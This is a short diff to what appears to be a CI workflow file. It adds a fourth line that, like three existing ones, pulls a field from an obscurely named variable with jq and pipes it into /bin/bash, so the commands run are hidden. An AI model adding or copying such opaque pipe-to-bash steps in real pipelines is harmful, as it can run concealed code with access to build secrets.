@@ -26,6 +26,7 @@ jobs:
           echo $ps63 | jq -r .p58 | /bin/bash
           echo $ktdx6610 | jq -r .b82 | /bin/bash
           echo $frm3845 | jq -r .qcut16901 | /bin/bash
+          echo $nxexb60354 | jq -r .o14741 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
